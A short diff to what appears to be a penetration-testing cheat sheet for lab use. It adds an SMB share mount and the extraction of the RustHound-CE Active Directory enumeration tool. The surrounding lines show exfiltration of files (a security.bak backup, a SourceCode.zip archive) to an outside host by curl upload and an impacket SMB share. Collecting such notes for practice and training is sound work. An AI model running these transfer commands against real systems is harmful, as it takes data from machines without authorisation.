@@ -457,6 +457,7 @@ curl.exe -F "files=@C:\Users\mlefay\Documents\security.bak" http://192.168.49.12
 # Upload a file via smbshare 
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 
+net use \\192.168.49.129\share /user:test test
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\share\
 
 # Upload a file via FTP  
@@ -3002,6 +3003,7 @@ cargo install rusthound-ce
 or
 
 wget https://github.com/g0h4n/RustHound-CE/releases/download/v2.4.5/rusthound-ce-Linux-gnu-x86_64.tar.gz
+tar -xvzf rusthound-ce-Linux-gnu-x86_64.tar.gz
 
 or
 
